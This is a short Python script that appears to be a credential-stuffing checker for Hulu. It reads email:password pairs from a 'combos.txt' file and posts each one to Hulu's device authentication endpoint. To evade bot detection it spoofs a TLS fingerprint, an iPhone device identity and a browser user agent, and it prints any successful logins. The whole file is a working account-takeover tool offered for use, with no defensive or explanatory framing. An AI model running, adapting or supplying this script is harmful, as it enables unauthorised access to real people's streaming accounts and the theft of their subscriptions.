import os, sys, json, time, random, string, ctypes, concurrent.futures
import requests
import colorama
import pystyle
import datetime
import uuid
import functools
import threading

from colorama import Fore, Style
from tls_client import Session
from random import choice
from json import dumps
from pystyle import System, Colors, Colorate, Write
from concurrent import futures
from uuid import uuid4

def hulu_checker(user, passw):
    session = Session(client_identifier="chrome_114", random_tls_extension_order=True)
    data = {
        "affiliate_name": "apple",
        "friendly_name": "mbconfigs+Iphone",
        "password": passw,
        "product_name": "iPhone7%2C2",
        "serial_number": "00001e854946e42b1cbf418fe7d2dcd64df0",
        "user_email": user,
    }
    head = {
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Pragma': 'no-cache',
        'Accept': '*/*',
    }

    try:
        response = session.post('https://auth.hulu.com/v1/device/password/authenticate', data=data, headers=head)
        response.raise_for_status()
        json_response = response.json()
    except requests.exceptions.HTTPError as http_err:
        print(f"HTTP error occurred: {http_err}")
    except requests.exceptions.RequestException as err:
        print(f"Error occurred: {err}")
    except Exception as e:
        print(f"Other error occurred: {e}")
    else:
        print(f"Success, response: {json_response}")


with open('combos.txt', 'r') as f:
    accounts = f.read().splitlines()

for account in accounts:
    user, passw = account.split(':')
    hulu_checker(user, passw)

